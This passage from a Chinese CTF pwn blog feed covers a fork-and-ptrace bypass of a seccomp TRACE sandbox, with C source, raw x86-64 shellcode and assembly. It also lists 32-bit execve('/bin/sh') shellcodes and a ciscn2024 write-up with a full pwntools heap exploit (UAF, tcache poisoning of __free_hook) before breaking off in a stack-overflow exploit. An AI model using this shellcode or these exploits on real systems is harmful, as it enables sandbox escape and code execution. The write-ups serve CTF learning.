ptrace</h3><blockquote><p>有时我们会遇到返回TRACE的沙箱，并且题目没有禁用fork和ptrace，这就给了我们绕过沙箱的手段<br>下面是一个示例程序，我们可以看到，题目对execve,execveat,open,openat,openat2都加了限制，但返回的不是KILL，而是TRACE;<br>于是我们就可以通过fork加ptrace的方式绕过沙箱，拿到shell</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// gcc ./pwn.c -o pwn -lseccomp </span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timespec</span> <span class="hljs-title">t</span> =</span> &#123;<span class="hljs-number">1</span>,<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">sandbox</span><span class="hljs-params">()</span><br>&#123;<br>    scmp_filter_ctx ctx;<br>    ctx = seccomp_init(SCMP_ACT_ALLOW);<br>    seccomp_rule_add(ctx,SCMP_ACT_TRACE(<span class="hljs-number">0</span>),SCMP_SYS(execve),<span class="hljs-number">0</span>);<br>    seccomp_rule_add(ctx,SCMP_ACT_TRACE(<span class="hljs-number">1</span>),SCMP_SYS(execveat),<span class="hljs-number">0</span>);<br>    seccomp_rule_add(ctx,SCMP_ACT_TRACE(<span class="hljs-number">2</span>),SCMP_SYS(open),<span class="hljs-number">0</span>);<br>    seccomp_rule_add(ctx,SCMP_ACT_TRACE(<span class="hljs-number">3</span>),SCMP_SYS(openat),<span class="hljs-number">0</span>);<br>    seccomp_rule_add(ctx,SCMP_ACT_TRACE(<span class="hljs-number">4</span>),SCMP_SYS(openat2),<span class="hljs-number">0</span>);<br>    seccomp_load(ctx);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    sandbox();<br><br>    <span class="hljs-comment">// fork出子进程</span><br>    <span class="hljs-type">pid_t</span> pid = syscall(SYS_fork);<br><br>    <span class="hljs-keyword">if</span>(pid&lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-comment">// fork错误直接退出</span><br>        syscall(SYS_write,STDOUT_FILENO,<span class="hljs-string">&quot;fork error!\n&quot;</span>,<span class="hljs-number">12</span>);<br>        syscall(SYS_exit,<span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-comment">// 子进程</span><br>        <span class="hljs-comment">// 不断执行sleep(1),printf(&quot;child execve\n&quot;),execve(&quot;/bin/bash&quot;,0,0)</span><br>        <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>        &#123;<br>            syscall(SYS_nanosleep,t,<span class="hljs-number">0</span>);<br>            syscall(SYS_write,STDOUT_FILENO,<span class="hljs-string">&quot;child execve\n&quot;</span>,<span class="hljs-number">13</span>);<br>            syscall(SYS_execve,<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-comment">// 父进程</span><br>        <span class="hljs-comment">// 首先attach到子进程上</span><br>        syscall(SYS_ptrace,PTRACE_ATTACH,pid,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>        syscall(SYS_write,STDOUT_FILENO,<span class="hljs-string">&quot;father attach\n&quot;</span>,<span class="hljs-number">14</span>);<br>        <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>        &#123;<br>            <span class="hljs-comment">// 不断等待子进程改变状态，在本题即为等待子进程触发seccomp然后stop</span><br>            syscall(SYS_wait4,pid,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>            <span class="hljs-comment">// 设置跟踪seccomp,并且在子进程触发seccomp时stop子进程</span><br>            syscall(SYS_ptrace,PTRACE_SETOPTIONS,pid,<span class="hljs-number">0</span>,PTRACE_O_TRACESECCOMP);<br>            <span class="hljs-comment">// 使子进程继续执行，并且此时没有了seccomp的检测，即成功绕过seccomp</span><br>            syscall(SYS_ptrace,PTRACE_CONT,pid,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编写成shellcode如下,去掉了中间用write输出的提示信息,长度为203字节</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;H\xc7\xc09\x00\x00\x00\x0f\x05H\x85\xc0\x0f\x88\xad\x00\x00\x00H\x83\xf8\x00tiI\x89\xc0L\x89\xc6H\xc7\xc0e\x00\x00\x00H\xc7\xc7\x10\x00\x00\x00H1\xd2M1\xd2\x0f\x05L\x89\xc7H1\xf6H1\xd2M1\xd2H\xc7\xc0=\x00\x00\x00\x0f\x05H\xc7\xc7\x00B\x00\x00L\x89\xc6H1\xd2I\xc7\xc2\x80\x00\x00\x00H\xc7\xc0e\x00\x00\x00\x0f\x05H\xc7\xc7\x07\x00\x00\x00L\x89\xc6H1\xd2M1\xd2H\xc7\xc0e\x00\x00\x00\x0f\x05\xeb\xb3j\x00j\x01H\x89\xe7H1\xf6H\xc7\xc0#\x00\x00\x00\x0f\x05H\xc7\xc0h\x00\x00\x00PH\xb8/bin/basPH\x89\xe7H\xc7\xc6\x00\x00\x00\x00H1\xd2H\xc7\xc0;\x00\x00\x00\x0f\x05\xeb\xc2H\xc7\xc0&lt;\x00\x00\x00H1\xff\x0f\x05&#x27;</span><br></code></pre></td></tr></table></figure><p>汇编也放一下</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">_start:</span><br>    /* fork() */<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">57</span><br>    <span class="hljs-keyword">syscall</span><br><br>    /* if(pid&lt;<span class="hljs-number">0</span>) exit(<span class="hljs-number">0</span>) */<br>    <span class="hljs-keyword">test</span> <span class="hljs-built_in">rax</span>,<span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">js</span> _exit<br><br>    /* if(pid==<span class="hljs-number">0</span>) */<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">0</span><br>    <span class="hljs-keyword">je</span> child_process<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">parent_process:</span><br>    /* save pid with <span class="hljs-built_in">r8</span> */<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>,<span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">r8</span><br><br>    /* ptrace(PTRACE_ATTACH,pid,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<span class="hljs-comment">; */</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">101</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0x10</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">rdx</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">r10</span>,<span class="hljs-built_in">r10</span><br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">monitor_child:</span><br>    /* wait4(pid,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<span class="hljs-comment">; */</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">r8</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">rdx</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">r10</span>,<span class="hljs-built_in">r10</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">61</span><br>    <span class="hljs-keyword">syscall</span><br><br>    /* ptrace(PTRACE_SETOPTIONS, child_pid, <span class="hljs-number">0</span>, PTRACE_O_TRACESECCOMP) */<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0x4200</span> /* PTRACE_SETOPTIONS */<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">r8</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">rdx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>,<span class="hljs-number">0x00000080</span> /* PTRACE_O_TRACESECCOMP */<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">101</span><br>    <span class="hljs-keyword">syscall</span><br><br>    /* ptrace(PTRACE_CONT,pid,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>) */<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0x7</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">r8</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">rdx</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">r10</span>,<span class="hljs-built_in">r10</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">101</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">jmp</span> monitor_child<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">child_process:</span><br>    /* <span class="hljs-keyword">syscall</span>(SYS_nanosleep,t,<span class="hljs-number">0</span>) */<br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">0x23</span><br>    <span class="hljs-keyword">syscall</span><br><br>    /* execve(<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>) */<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">0x0068</span> /* <span class="hljs-string">&quot;h\x00&quot;</span> */<br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">0x7361622f6e69622f</span> /* <span class="hljs-string">&quot;/bin/bas&quot;</span> */<br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>,<span class="hljs-number">0</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">rdx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">59</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">jmp</span> child_process<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">_exit:</span><br>    /* exit(<span class="hljs-number">0</span>) */<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure><p>注意一下这样最终拿到的shell仍然是在沙箱环境下的，除了基本的cd,pwd,echo，很多命令执行不了，而且echo也只有部分功能<br>这边给出ls和读flag的方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">ls</span></span><br>echo *<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cat</span> flag</span><br>read -r f &lt; flag<br>echo $&#123;f&#125;<br></code></pre></td></tr></table></figure><h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><h3 id="execve-1"><a href="#execve-1" class="headerlink" title="execve"></a>execve</h3><h4 id="较短-21字节"><a href="#较短-21字节" class="headerlink" title="较短 21字节"></a>较短 21字节</h4><blockquote><p>由于中间有个’\x0b’，所以scanf读不进去</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">push</span>   <span class="hljs-number">0xb</span><br><span class="hljs-keyword">pop</span>    <span class="hljs-built_in">eax</span><br><span class="hljs-keyword">cdq</span><br><span class="hljs-keyword">push</span>   <span class="hljs-built_in">edx</span><br><span class="hljs-keyword">push</span>   <span class="hljs-number">0x68732f2f</span><br><span class="hljs-keyword">push</span>   <span class="hljs-number">0x6e69622f</span><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">esp</span><br><span class="hljs-keyword">xor</span>    <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">ecx</span><br><span class="hljs-keyword">int</span>    <span class="hljs-number">0x80</span><br></code></pre></td></tr></table></figure><h4 id="scanf可读取"><a href="#scanf可读取" class="headerlink" title="scanf可读取"></a>scanf可读取</h4><blockquote><p>较长，但是可以被scanf读取</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&quot;\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh&quot;</span><br></code></pre></td></tr></table></figure><h4 id="纯ascii字符-1"><a href="#纯ascii字符-1" class="headerlink" title="纯ascii字符"></a>纯ascii字符</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&quot;PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA&quot;</span><br></code></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/16/input/">CTF中常见的C语言输入函数截断属性总结</a><br><a href="https://blog.csdn.net/FLM19990626/article/details/129154795">Ubuntu 发行版本与内核对应关系</a><br><a href="https://xz.aliyun.com/t/13813">shellcode进阶之手写shellcode</a><br><a href="https://xz.aliyun.com/t/12787">栈沙箱学习之orw</a><br><a href="https://xz.aliyun.com/t/6645">shellcode 的艺术</a><br><a href="https://blog.csdn.net/qq_54218833/article/details/134205383">各种seccomp绕过</a></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn2024 华中地区半决赛 wp</title>
      <link href="/2024/06/26/ciscn2024-%E5%8D%8E%E4%B8%AD%E5%9C%B0%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9B-wp/"/>
      <url>/2024/06/26/ciscn2024-%E5%8D%8E%E4%B8%AD%E5%9C%B0%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9B-wp/</url>
      
        <content type="html"><![CDATA[<p>ciscn2024 华中地区半决赛, starlink 还没复现</p><span id="more"></span><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>很简单的堆题，题目libc版本是glibc-2.31，对应ubuntu-20.04版本</p><p>这个版本tcache没有加入PROTECT_PTR保护fd指针(glibc-2.32加入)，所以就不用泄露heap_base了<br>但要注意tcache的count，glibc-2.30之前一直是检测fd指针是否为空指针来判断tcache堆块是否有剩余，glibc-2.30及以后改为使用count</p><p>题目是个笔记管理系统，delete函数有UAF</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>利用unsortedbin的bk指针泄露libc_base</li><li>然后直接利用tcache打free_hook</li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size,content</span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;5. exit\n&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;The size of your content: \n&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&#x27;content: \n&#x27;</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;5. exit\n&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;index: \n&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br>    p.recvuntil(<span class="hljs-string">b&#x27;The size of your content: \n&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&#x27;Content: \n&#x27;</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;5. exit\n&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;index: \n&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode()) <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;5. exit\n&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;index: \n&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    p.recvuntil(<span class="hljs-string">b&#x27;5. exit\n&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;5&#x27;</span>)<br><br><span class="hljs-comment"># leak libc_base</span><br>create(<span class="hljs-number">0x450</span>,<span class="hljs-string">b&#x27;bbbb&#x27;</span>)<br>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;cccc&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Content: &#x27;</span>)<br>leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = leak - <span class="hljs-number">0x1ecbe0</span><br>log.success(<span class="hljs-string">&#x27;libc_base ==&gt; &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>create(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;dddd&#x27;</span>)<br>create(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;dddd&#x27;</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,p64(free_hook))<br>create(<span class="hljs-number">0x20</span>,p64(free_hook))<br>create(<span class="hljs-number">0x20</span>,p64(system))<br><br>create(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>delete(<span class="hljs-number">6</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="protoverflow"><a href="#protoverflow" class="headerlink" title="protoverflow"></a>protoverflow</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>protobuf我在初赛的wp中讲过了，这次就跳过了</p><p>这是还原出的结构体</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">syntax</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;proto2&quot;</span><span class="hljs-comment">;</span><br><br>message protoMessage &#123;<br>    optional string name <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>    optional string phoneNumber <span class="hljs-operator">=</span> <span class="hljs-number">2</span><span class="hljs-comment">;</span><br>    required bytes buffer <span class="hljs-operator">=</span> <span class="hljs-number">3</span><span class="hljs-comment">;</span><br>    required uint32 size <span class="hljs-operator">=</span> <span class="hljs-number">4</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>后面就是很简单的栈溢出</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 